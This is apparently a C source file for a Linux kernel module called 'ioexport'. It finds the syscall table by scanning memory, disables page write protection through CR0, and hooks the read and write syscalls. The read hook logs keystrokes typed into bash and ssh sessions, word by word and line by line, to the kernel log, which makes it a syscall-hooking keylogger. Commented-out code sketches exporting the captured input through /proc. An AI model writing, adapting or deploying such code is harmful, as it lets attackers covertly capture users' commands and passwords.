#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/spinlock.h>
#include <linux/ctype.h>


#include <linux/proc_fs.h>
#include <asm/uaccess.h>

#define PROC_NAME "ioexport"

#ifndef MIN
#define MIN(a, b) (a < b ) ? a : b
#endif

unsigned long **sys_call_table;


asmlinkage long (*ref_sys_write)(unsigned int fd, const char __user *buf, size_t count);
asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
//int ioexport(unsigned int fd, char __user *buf, size_t count);
int ioexport(unsigned int fd, const char __user *buf, size_t count); 


static struct proc_dir_entry *proc_io = NULL;
//static int proc_io_read(char *page, char **start, off_t off, int count, int *eof, void *data);
//static struct ring_buffer *rb = NULL;

//static spinlock_t queue_lock; 

/*
#define MESSAGE_MAX_SIZ 128
#define MESSAGE_MAX_COUNT 20

CIRCLEQ_HEAD(circleq, msg) head;
struct circleq *headp;

struct msg {
        int pid;
        unsigned int fd;
        char buff[MESSAGE_MAX_SIZ];
        size_t siz;

        CIRCLEQ_ENTRY(msg) entries;
};

struct msg output_msg[MESSAGE_MAX_COUNT], *w_cursor, *r_cursor;

static void queue_init() {
        int i;
        CIRCLEQ_INIT(&head);

        memset(&output_msg, sizeof(output_msg) * MESSAGE_MAX_COUNT, 0);

        for (i = 0; i < MESSAGE_MAX_COUNT; i++)
                CIRCLEQ_INSERT_HEAD(&head, &output_msg[i], entries);

        r_cursor = w_cursor = CIRCLEQ_FIRST(&head);

	spin_lock_init(&queue_lock);
}
*/

/*
#define QUEUE_PUSH(_pid, _fd, _data, _siz) \
	spin_lock(&queue_lock); \
        w_cursor->pid = _pid; \
        w_cursor->fd = _fd; \
        memcpy(w_cursor->buff, _data, _siz); \
        w_cursor->siz = _siz;\
        w_cursor =  CIRCLEQ_LOOP_NEXT(&head, w_cursor, entries); \
	spin_unlock(&queue_lock)

#define QUEUE_POP for (; r_cursor != w_cursor; r_cursor = CIRCLEQ_LOOP_NEXT(&head, r_cursor, entries)) 

#define QUEUE_POP(i) (i) = r_cursor ; r_cursor = CIRCLEQ_LOOP_NEXT(&head, r_cursor, entries)
*/

#ifndef STDOUT_FILENO
#define	STDOUT_FILENO	1
#endif

#ifndef STDIN_FILENO
#define	STDIN_FILENO	0
#endif


/*
static int proc_io_read(char *page, char **start,
                            off_t off, int count, 
                            int *eof, void *data) {

	struct msg *i = NULL;
	int offset = 0, n;

	spin_lock(&queue_lock);

	n = 0;

	while (r_cursor != w_cursor) {
		QUEUE_POP(i); 
		if (count - 2 > i->siz) {
			n += snprintf(page + offset, count - 2, "\n(%d) %.*s\n", i->pid, MIN(count - 2, i->siz), i->buff);
			offset += n;
			count -= n;
					
		} else { 
			break;
		} 
			
	} 
	

	spin_unlock(&queue_lock);

	* eof = 0;

	return offset;	
	
} 


int ioexport(unsigned int fd, const char __user *buf, size_t count) {
	

	QUEUE_PUSH(current->pid, fd, buf, MIN(count, MESSAGE_MAX_SIZ));
	
	return 1;
} 
*/


asmlinkage long new_sys_write(unsigned int fd, const char __user *buf, size_t count)
{
	//ioexport(fd, buf, count);

	return ref_sys_write(fd, buf, count);
}

static char word_buf[64]; 
static int word_len = 0;

static char line_buf[128]; 
static int line_len = 0;

/*
struct ioexport_tasks_list {
	pid_t 	pid;
	pid_t   ppid;
	char 	*comm;
}; 
#define COMM_MASK_MAX_SIZ 128

struct ioexport_filter_list {
	int domain;
	char comm_mask[COMM_MAS_MAX_SIZ];
	
	
} 
*/


asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{

	unsigned int ret;
	char *comm = current->comm;
	pid_t pid = current->pid;

	ret = ref_sys_read(fd, buf, count);

	/*
	if ( comm && (strncmp(comm, "bash", sizeof("bash") - 1) || strncmp(comm, "ssh", 3))) {
		if (strncmp(comm, "tail", 4) && strncmp(comm, "sshd", 4) && strncmp(comm, "rsyslogd", sizeof "rsyslogd" - 1)) 
			printk("ioexport skip %s\n", comm);
		return ret;
	} 
	*/

#define STRSZ(a)  ((a)), sizeof((a)) - 1

#define SHELL "bash"
#define SSH "ssh"
	
	if (comm) {
		if (strncmp(comm, STRSZ(SHELL)) && strncmp(comm, STRSZ(SSH))) {
			if (strncmp(comm, STRSZ("tail")) && strncmp(comm, STRSZ("rsyslogd"))) 
				printk("ioexport skip %s\n", comm);
			return ret;
		} 
	} 

	/*
	if ( comm && strncmp(comm, "bash", sizeof("bash") - 1)) {
		return ret;
	} 
	*/


	if (fd == STDIN_FILENO) {
		/* word section */
		if (count == 1) { 
			if ( isalnum(*buf) || isgraph(*buf)) {
      			        memcpy((void *) (word_buf + word_len), (void *) buf, 1);

                                if (word_len < sizeof(word_buf)) {
                                        word_len++;
                                } else {
                                        printk("ioexport: word overflow\n");
                                        word_len = 0;
                                }

			} 

			if (isspace(*buf) || iscntrl(*buf)) {
				if (word_len) 
					printk("%d '%s' word '%.*s'\n", pid, comm, word_len, word_buf);
				word_len = 0;
			} 

			if (isprint(*buf)) {
				memcpy((void *) (line_buf + line_len), (void *) buf, 1);
                                line_len++;
			} 

			if (line_len > sizeof(line_buf) || !isprint(*buf)) {
				if (line_len) 
					printk("%d '%s' line '%.*s'\n", pid, comm, line_len, line_buf);
				line_len = 0;
			} 
			

		 }
			
		//printk("%d '%s' data(%d) '%.*s'\n", pid, comm, ret, ret, buf);
			
	}/* else  { 
		printk("%d, FD %d '%s' IGNORE %d bytes\n", pid, fd, comm, ret);
	} 
	*/

	/*
	if (fd == STDIN_FILENO && count > 0) {
		ioexport(fd, buf, count);
		printk("%s %d read(%zu) '%.*s', ret: %d\n", comm, pid, count, count, buf, ret);

	} 
	*/



	return ret;
}

static unsigned long **aquire_sys_call_table(void)
{
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;

		if (sct[__NR_close] == (unsigned long *) sys_close) 
			return sct;

		offset += sizeof(void *);
	}

	return NULL;
}

#define DISABLE_PAGE_PROTECTION  write_cr0 (read_cr0 () & (~ 0x10000));
#define ENABLE_PAGE_PROTECTION write_cr0 (read_cr0 () | 0x10000);


static int __init ioexport_start(void) 
{
	if(!(sys_call_table = aquire_sys_call_table())) {
		printk(KERN_INFO "ioexport_start !sys_call_table");
		return -1;
	} 

	/*
	proc_io =  create_proc_entry(PROC_NAME, 0644, NULL);
	
	if (proc_io == NULL) {
		printk(KERN_ERR "ioexport: create_proc_entry error ENOMEM\n");
		return -ENOMEM;
	} 

	proc_io->read_proc = proc_io_read;


	proc_io->data = kmalloc(strlen( "first file private data"), GFP_KERNEL);
	strcpy(proc_io->data, "first file private data");
	*/

	DISABLE_PAGE_PROTECTION;
	//disable_page_protection();
	ref_sys_write = (void *)sys_call_table[__NR_write];
	ref_sys_read = (void *)sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
	sys_call_table[__NR_write] = (unsigned long *)new_sys_write;

	

	ENABLE_PAGE_PROTECTION;
	//enable_page_protection();

	//queue_init();

	return 0;
}

static void __exit ioexport_end(void) 
{

	if (proc_io != NULL) {
		kfree(proc_io->data);	
		remove_proc_entry(PROC_NAME, NULL);
		
	} 


	if(!sys_call_table) {
		printk(KERN_INFO "ioexport_end !sys_call_table");
		return;
	} 

	DISABLE_PAGE_PROTECTION;
	sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
	sys_call_table[__NR_write] = (unsigned long *)ref_sys_write;
	ENABLE_PAGE_PROTECTION;
}

module_init(ioexport_start);
module_exit(ioexport_end);
